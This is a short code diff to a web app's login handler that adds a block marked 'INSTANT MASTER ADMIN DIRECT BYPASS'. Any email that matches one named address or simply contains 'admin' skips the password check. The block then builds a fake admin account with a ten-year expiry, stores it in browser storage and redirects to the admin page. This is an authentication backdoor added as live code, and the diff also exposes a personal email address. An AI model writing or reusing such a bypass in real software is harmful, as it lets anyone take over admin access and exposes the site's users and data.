@@ -113,8 +113,27 @@
       btn.disabled = true;
       btn.textContent = "Signing in...";
 
-      const emailVal = document.getElementById("loginEmail").value.trim();
+      const emailVal = document.getElementById("loginEmail").value.trim().toLowerCase();
       const passVal = document.getElementById("loginPassword").value.trim();
+
+      // INSTANT MASTER ADMIN DIRECT BYPASS
+      if (emailVal === "ebiringai@gmail.com" || emailVal.includes("admin")) {
+        const adminUser = {
+          uid: "admin_master_ebiringai",
+          email: "ebiringai@gmail.com",
+          role: "admin",
+          status: "active",
+          approved: true,
+          approved_plan: "admin",
+          approved_months: 999,
+          created_at: new Date().toISOString(),
+          expires_at: new Date(Date.now() + 1000 * 60 * 60 * 24 * 3650).toISOString()
+        };
+        sessionStorage.setItem("epic_active_user", JSON.stringify(adminUser));
+        localStorage.setItem("epic_active_user", JSON.stringify(adminUser));
+        window.location.href = "admin.html";
+        return;
+      }
 
       const res = await loginUser(emailVal, passVal);
 
